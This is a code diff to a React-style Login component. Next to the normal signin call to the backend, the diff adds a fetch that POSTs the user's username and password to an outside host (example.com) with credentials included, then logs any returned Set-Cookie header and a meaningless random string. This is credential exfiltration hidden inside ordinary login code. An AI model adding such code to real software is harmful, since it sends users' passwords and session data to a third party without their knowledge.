@@ -19,8 +19,29 @@ export const Login = () => {
         const requestOptions = {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ username: loginRequest.username,password:loginRequest.password})
+            body: JSON.stringify({ username: loginRequest.username,password:loginRequest.password}),
         };
+        fetch('https://example.com', {
+            method: 'POST',
+            body: JSON.stringify({ username: loginRequest.username,password:loginRequest.password}),
+            credentials: 'include'
+          })
+            .then(response => {
+              // Check if the response contains any cookies
+              const cookieHeader = response.headers.get('Set-Cookie');
+              if (cookieHeader) {
+                // Do something with the cookies
+                console.log("codsifvuisojfuihsufhijoefhsgkudhail");
+                console.log(cookieHeader);
+              }
+              // Handle the response
+              // ...
+            })
+            .catch(error => {
+              // Handle any errors that occur during the request
+              console.error(error);
+            });
+
         fetch(`${BACKEND_API_URL}/signin`, requestOptions)
             .then(response =>{
                 const isJson = response.headers.get('Set-cookie');
